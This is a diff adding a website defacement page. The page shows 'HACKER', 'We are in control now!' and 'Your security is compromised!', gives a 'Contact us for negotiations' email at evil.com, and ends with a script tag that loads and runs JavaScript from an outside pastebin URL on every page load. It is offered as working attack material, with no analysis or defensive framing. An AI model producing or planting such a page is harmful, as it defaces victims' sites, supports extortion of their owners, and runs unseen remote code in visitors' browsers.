@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Hacked</title>
+    <style>
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes moveText {
+            0% { transform: translateX(-50px); }
+            50% { transform: translateX(50px); }
+            100% { transform: translateX(-50px); }
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+        }
+
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        h1 {
+            font-size: 64px;
+            animation: flicker 1s infinite;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 30px;
+            filter: grayscale(100%) contrast(200%);
+            animation: flicker 1.5s infinite;
+        }
+
+        p {
+            font-size: 28px;
+            margin-top: 30px;
+            animation: moveText 4s infinite alternate;
+        }
+
+        .hacker-info {
+            font-size: 20px;
+            margin-top: 50px;
+            border: 2px solid #0f0;
+            padding: 20px;
+            width: 70%;
+            margin-left: auto;
+            margin-right: auto;
+            background-color: #222;
+        }
+
+        .hacker-info p {
+            margin: 10px 0;
+        }
+
+        /* Responsiveness */
+        @media only screen and (max-width: 768px) {
+            h1 {
+                font-size: 48px;
+            }
+
+            p {
+                font-size: 20px;
+            }
+
+            .hacker-info {
+                width: 90%;
+            }
+        }
+
+        @media only screen and (max-width: 480px) {
+            h1 {
+                font-size: 36px;
+            }
+
+            .hacker-info {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HACKER</h1>
+        <img src="hacking.gif" alt="Hacking Image">
+        <p>We are in control now!</p>
+        <div class="hacker-info">
+            <p>Your security is compromised!</p>
+            <p>Contact us for negotiations:</p>
+            <p>Email: tester@evil.com</p>
+           
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://paste.c-net.org/BearerBeatrice"></script>
+</body>
+</html>
